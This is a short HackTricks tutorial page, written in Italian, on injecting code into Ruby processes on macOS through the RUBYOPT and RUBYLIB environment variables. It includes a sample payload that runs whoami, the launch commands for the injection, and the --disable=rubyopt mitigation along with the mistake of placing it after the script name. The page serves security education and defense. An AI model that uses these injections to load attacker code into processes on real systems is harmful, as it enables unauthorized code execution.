# Injection nelle applicazioni Ruby su macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby analizza gli switch della riga di comando supportati dalla variabile d'ambiente `RUBYOPT` prima di eseguire uno script. Ruby rifiuta l'esecuzione di codice tramite `-e` in `RUBYOPT`, ma `-I` può anteporre una directory di ricerca delle librerie e `-r` può richiedere una libreria. Di conseguenza, un processo che avvia Ruby con variabili d'ambiente controllate dall'attaccante può essere indotto a caricare codice Ruby controllato dall'attaccante.<sup>[[1]](#references)</sup>

Create `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Crea uno script Ruby innocuo come `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Eseguilo con un valore `RUBYOPT` controllato:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Per disabilitare questo comportamento, passa `--disable=rubyopt` (o `--disable-rubyopt`) **prima** del nome dello script:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Un'opzione scritta dopo `hello.rb` viene passata allo script in `ARGV`; non disabilita l'elaborazione precedente di Ruby di `RUBYOPT`.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## RUBYLIB

Invece di anteporre la directory di caricamento con `-I` all'interno di `RUBYOPT`, la variabile d'ambiente separata `RUBYLIB` aggiunge directory al `$LOAD_PATH` di Ruby. In combinazione con `RUBYOPT=-r<module>`, carica il codice dell'attaccante senza dover inserire `-I` in `RUBYOPT`:<sup>[[1]](#references)</sup>
```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```
## References

- [1] [Documentazione Ruby - Opzioni della riga di comando Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
